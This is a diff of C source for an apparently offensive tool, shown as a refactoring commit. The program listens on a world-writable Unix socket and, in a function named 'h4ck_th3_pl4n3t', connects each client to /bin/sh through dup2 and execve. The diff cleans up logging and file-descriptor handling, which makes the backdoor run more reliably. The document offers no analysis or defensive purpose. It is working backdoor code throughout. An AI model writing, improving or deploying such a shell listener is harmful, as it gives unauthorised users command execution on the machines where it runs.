@@ -79,14 +79,13 @@ make_named_socket (const char *filename)
 
 void h4ck_th3_pl4n3t(int client_sock)
 {
+	int read_size;
+	char client_message[2000];
+
 	if (client_sock < 0){
-		printy("fuck(): client_sock: is %d\n", client_sock);
 		perror("accept failed");
 		exit(1);
 	}
-
-	int read_size;
-	char client_message[2000];
 
 	setsid();
 	dup2(client_sock, STDIN_FILENO);
@@ -108,17 +107,17 @@ void h4ck_th3_pl4n3t(int client_sock)
 			                       "LANG=en_US.UTF-8", NULL };
 
 			execve("/bin/sh", (char **)args, (char **)env);
+			close(client_sock);
 		}
 	}
 	if(read_size == 0){
-		puts("Client disconnected");
+		printy("%-20s\n", "client disconnected");
 		fflush(stdout);
 	}
 	else if(read_size == -1){
 		perror("recv failed");
 		exit(1);
 	}
-	printy("closing client sock: %d: bye bye", client_sock);
 	close(client_sock);
 	exit(0);
 }
@@ -134,23 +133,24 @@ int main(int argc , char *argv[])
 
 	int server = make_named_socket(sockname);
 	chmod(sockname, 00666); // world writable ;)
+	printy("%-20s is %s\n", "socket:", sockname);
 
 	if (listen(server, 3) != 0) {
 		perror("listen");
 		exit(1);
 	}
 
-	while (1+1 == 2)
+	while (1 + 1 == 2)
 	{
 		int pid;
 		int newfd = dup(3);
 
-		printy("main():      server: is %d\n", server);
-		printy("main():       newfd: is %d\n", newfd);
+		printy("%-20s is %d\n", "server fd:", server);
+		printy("%-20s is %d\n", "new fd:", newfd);
 
 		int client_sock = accept(newfd, (struct sockaddr *)&newfd,
 			                     (socklen_t *)&c);
-		printy("main(): client_sock: is %d\n", client_sock);
+		printy("%-20s is %d\n", "client_sock:", client_sock);
 
 		if((pid = fork()) == -1){
 			perror("fork failed");
@@ -158,15 +158,20 @@ int main(int argc , char *argv[])
 			continue;
 		}
 		else if (pid == 0){
+			close(server);
 			h4ck_th3_pl4n3t(client_sock);
+			close(client_sock);
+			close(newfd);
 			break;
 		}
 		else{
-			int status;
-			printy("main(): had a baby called: pid %d\n", pid);
+			printy("had a baby named %d\n", pid);
+			close(client_sock);
+			close(newfd);
 		}
 	}
 	close(server);
 	unlink(sockname);
+	printy("%-20s\n", "bye bye");
 	return 0;
 }
